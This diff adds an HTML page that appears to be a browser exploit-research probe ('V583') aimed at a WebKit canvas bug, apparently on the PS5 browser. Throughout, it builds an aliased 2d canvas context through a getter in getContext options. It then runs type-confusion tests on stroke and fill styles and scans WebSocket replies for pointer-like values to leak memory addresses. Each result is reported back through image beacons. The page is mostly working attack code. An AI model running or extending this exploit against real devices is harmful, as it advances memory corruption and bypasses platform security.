@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V583</title></head>
+<body><pre id="out">V583 — WS frame injection + alias info leak probe</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V583-'+tag+'?d='+encodeURIComponent(String(body).slice(0,800))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+function bufHex(buf,max){
+  var a=new Uint8Array(buf instanceof ArrayBuffer?buf:buf.buffer);
+  var s='';var n=Math.min(a.length,max||256);
+  for(var i=0;i<n;i++)s+=('0'+a[i].toString(16)).slice(-2);
+  return s;
+}
+
+bk('BOOT','v583-ws-injection-probe');
+say('V583: WS frame injection + alias info leak\n');
+
+/* ===== PHASE A: Establish V573 alias ===== */
+var innerCtx=null;
+var c1=document.createElement('canvas');
+c1.width=4;c1.height=4;
+var d={};
+Object.defineProperty(d,'alpha',{get:function(){
+  innerCtx=c1.getContext('2d');
+  return true;
+}});
+c1.getContext('bitmaprenderer',d);
+
+var c2=document.createElement('canvas');
+c2.width=4;c2.height=4;
+var ctx2=c2.getContext('2d');
+
+ctx2.lineWidth=31337.31337;
+var aliasOK=innerCtx&&(Math.abs(innerCtx.lineWidth-31337.31337)<0.001);
+bk('ALIAS',aliasOK?'YES':'NO');
+say('Alias: '+(aliasOK?'CONFIRMED':'FAILED'));
+
+if(!aliasOK){bk('ABORT','no-alias');}
+else{
+
+/* ===== PHASE B: Full state scan with gradient ===== */
+var grad=ctx2.createLinearGradient(0,0,100,100);
+grad.addColorStop(0,'red');grad.addColorStop(1,'blue');
+ctx2.strokeStyle=grad;
+ctx2.fillStyle=grad;
+ctx2.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+ctx2.lineWidth=42.42;
+ctx2.miterLimit=10.0;
+ctx2.globalAlpha=1.0;
+ctx2.shadowBlur=0;
+ctx2.lineDashOffset=0;
+ctx2.setTransform(1,0,0,1,0,0);
+
+var scan={};
+try{scan.lw=dblHex(innerCtx.lineWidth);}catch(e){scan.lw='E';}
+try{scan.ml=dblHex(innerCtx.miterLimit);}catch(e){scan.ml='E';}
+try{scan.ga=dblHex(innerCtx.globalAlpha);}catch(e){scan.ga='E';}
+try{scan.sb=dblHex(innerCtx.shadowBlur);}catch(e){scan.sb='E';}
+try{scan.sox=dblHex(innerCtx.shadowOffsetX);}catch(e){scan.sox='E';}
+try{scan.soy=dblHex(innerCtx.shadowOffsetY);}catch(e){scan.soy='E';}
+try{scan.ldo=dblHex(innerCtx.lineDashOffset);}catch(e){scan.ldo='E';}
+try{var sc=innerCtx.shadowColor;scan.sc=sc;}catch(e){scan.sc='E';}
+try{var ss=innerCtx.strokeStyle;scan.ss=typeof ss+':'+String(ss).slice(0,80);}catch(e){scan.ss='E';}
+try{var fs=innerCtx.fillStyle;scan.fs=typeof fs+':'+String(fs).slice(0,80);}catch(e){scan.fs='E';}
+bk('SCAN',JSON.stringify(scan));
+say('State scan: '+JSON.stringify(scan,null,1));
+
+/* lineDash read-back with hex */
+var dashRead=[];
+try{dashRead=innerCtx.getLineDash();}catch(e){}
+var dashHex=[];
+for(var di=0;di<dashRead.length;di++)dashHex.push(dblHex(dashRead[di]));
+bk('DASH',dashHex.join(','));
+
+/* ===== PHASE C: Type confusion tests ===== */
+
+/* C1: Write gradient, overwrite with color, read back */
+ctx2.strokeStyle=grad;
+innerCtx.strokeStyle='#112233';
+var tc1;try{tc1=ctx2.strokeStyle;}catch(e){tc1='E:'+e.name;}
+bk('TC1','grad→color:'+tc1);
+say('TC1 grad→color: '+tc1);
+
+/* C2: Write color, overwrite with gradient, read back */
+ctx2.fillStyle='#aabbcc';
+try{innerCtx.fillStyle=grad;}catch(e){}
+var tc2;try{tc2=typeof ctx2.fillStyle+':'+String(ctx2.fillStyle).slice(0,100);}catch(e){tc2='E:'+e.name;}
+bk('TC2','color→grad:'+tc2);
+say('TC2 color→grad: '+tc2);
+
+/* C3: Pattern confusion */
+try{
+  var patC=document.createElement('canvas');patC.width=2;patC.height=2;
+  var patX=patC.getContext('2d');patX.fillStyle='red';patX.fillRect(0,0,2,2);
+  var pat=ctx2.createPattern(patC,'repeat');
+  ctx2.fillStyle=pat;
+  innerCtx.fillStyle='#deadbe';
+  var tc3=ctx2.fillStyle;
+  bk('TC3','pat→color:'+tc3);
+  say('TC3 pat→color: '+tc3);
+}catch(e){bk('TC3-ERR',e.name);}
+
+/* ===== PHASE D: WebSocket ===== */
+var ws=null;var msgLog=[];var binaryMsgs=[];
+
+try{
+  ws=new WebSocket('ws://'+location.hostname+':9090/v583');
+  ws.binaryType='arraybuffer';
+  bk('WS-CREATE','ok');
+
+  ws.onopen=function(){
+    bk('WS-OPEN','connected');
+    say('\nWS CONNECTED');
+    ws.send('SCAN:'+JSON.stringify(scan));
+    var ab=new ArrayBuffer(64);
+    var tv=new Uint8Array(ab);
+    for(var i=0;i<64;i++)tv[i]=i;
+    ws.send(ab);
+  };
+
+  ws.onmessage=function(ev){
+    var msg={t:Date.now()};
+    if(typeof ev.data==='string'){
+      msg.type='text';msg.size=ev.data.length;
+      msg.preview=ev.data.slice(0,200);
+      bk('WS-T',msg.size+':'+msg.preview.slice(0,150));
+      say('WS←text('+msg.size+'): '+msg.preview.slice(0,80));
+    }else if(ev.data instanceof ArrayBuffer){
+      msg.type='bin';msg.size=ev.data.byteLength;
+      msg.hex=bufHex(ev.data,512);
+
+      var a=new Uint8Array(ev.data);
+      var nz=0;var uniq={};
+      for(var i=0;i<a.length;i++){if(a[i])nz++;uniq[a[i]]=1;}
+      msg.nz=nz;msg.uniq=Object.keys(uniq).length;
+
+      /* Pointer scan: look for 8-byte aligned values that look like pointers */
+      var ptrs=[];
+      if(a.length>=8){
+        var dv=new DataView(ev.data);
+        for(var j=0;j<=a.length-8;j+=8){
+          var hi=dv.getUint32(j+4,true);
+          var lo=dv.getUint32(j,true);
+          /* PS5 FreeBSD userland: 0x800000000-0x7fffffffffff (typically 0x0000008XXXXXXX or similar) */
+          if(hi>0&&hi<0x00010000&&lo!==0&&!(hi===0&&lo<0x10000)){
+            ptrs.push(j+':'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8));
+          }
+          /* Also check for WebKit heap patterns */
+          if(hi>=0x00007f00&&hi<=0x00007fff){
+            ptrs.push(j+':7F:'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8));
+          }
+        }
+      }
+      if(ptrs.length>0){
+        msg.ptrs=ptrs.slice(0,20);
+        bk('PTR-FOUND',ptrs.slice(0,10).join('|'));
+        say('  ** POINTER-LIKE: '+ptrs.slice(0,5).join(' '));
+      }
+
+      binaryMsgs.push(msg);
+      bk('WS-B',msg.size+'B,nz='+nz+',u='+msg.uniq+',h='+msg.hex.slice(0,300));
+      say('WS←bin('+msg.size+'B) nz='+nz+' uniq='+msg.uniq);
+    }
+    msgLog.push(msg);
+  };
+
+  ws.onerror=function(){bk('WS-ERR','err');say('WS ERROR');};
+  ws.onclose=function(ev){
+    bk('WS-CLOSE','code='+ev.code+',msgs='+msgLog.length+',bin='+binaryMsgs.length);
+    say('WS closed: '+ev.code+', msgs='+msgLog.length);
+    /* Dump all binary message summaries */
+    for(var bi=0;bi<binaryMsgs.length&&bi<20;bi++){
+      var bm=binaryMsgs[bi];
+      bk('BIN-'+bi,bm.size+'B,nz='+bm.nz+',h='+bm.hex.slice(0,500));
+    }
+  };
+}catch(e){
+  bk('WS-FAIL',e.name+':'+e.message.slice(0,100));
+  say('WS FAILED: '+e.message);
+}
+
+/* ===== PHASE E: After WS establishes, send aliased state via WS ===== */
+setTimeout(function(){
+  if(!ws||ws.readyState!==1)return;
+  bk('PHASE-E','sending-alias-data');
+
+  /* Draw with gradient and send pixels */
+  ctx2.strokeStyle=grad;ctx2.lineWidth=5;
+  ctx2.beginPath();ctx2.moveTo(0,0);ctx2.lineTo(4,4);ctx2.stroke();
+  try{
+    var px=ctx2.getImageData(0,0,4,4);
+    ws.send(px.data.buffer);
+    bk('PIXELS','sent-'+px.data.length+'B');
+  }catch(e){bk('PX-ERR',e.name);}
+
+  /* Send all numerical state as Float64Array */
+  var nums=new Float64Array(10);
+  try{nums[0]=innerCtx.lineWidth;}catch(e){}
+  try{nums[1]=innerCtx.miterLimit;}catch(e){}
+  try{nums[2]=innerCtx.globalAlpha;}catch(e){}
+  try{nums[3]=innerCtx.shadowBlur;}catch(e){}
+  try{nums[4]=innerCtx.shadowOffsetX;}catch(e){}
+  try{nums[5]=innerCtx.shadowOffsetY;}catch(e){}
+  try{nums[6]=innerCtx.lineDashOffset;}catch(e){}
+  try{var xf=innerCtx.getTransform();nums[7]=xf.a;nums[8]=xf.d;nums[9]=xf.e;}catch(e){}
+  ws.send(nums.buffer);
+  bk('STATE-F64','sent-80B:'+bufHex(nums.buffer,80));
+},3000);
+
+/* ===== PHASE F: Deep save/restore ===== */
+setTimeout(function(){
+  bk('PHASE-F','deep-save-restore');
+  ctx2.strokeStyle='#ff0000';ctx2.save();
+  ctx2.strokeStyle=grad;ctx2.save();
+  ctx2.strokeStyle='#00ff00';ctx2.lineWidth=9999;ctx2.save();
+
+  var levels=[];
+  for(var i=0;i<3;i++){
+    var l={};
+    try{l.lw=dblHex(innerCtx.lineWidth);}catch(e){l.lw='E';}
+    try{l.ss=String(innerCtx.strokeStyle).slice(0,60);}catch(e){l.ss='E';}
+    try{innerCtx.restore();}catch(e){l.err=e.name;}
+    levels.push(l);
+  }
+  bk('RESTORE',JSON.stringify(levels));
+  say('\nRestore: '+JSON.stringify(levels));
+},5000);
+
+/* ===== Final ===== */
+setTimeout(function(){
+  var sum={alias:aliasOK,wsSt:ws?ws.readyState:-1,msgs:msgLog.length,bins:binaryMsgs.length};
+  bk('DONE',JSON.stringify(sum));
+  say('\nV583 DONE: '+JSON.stringify(sum));
+},10000);
+
+}
+</script>
+</body></html>
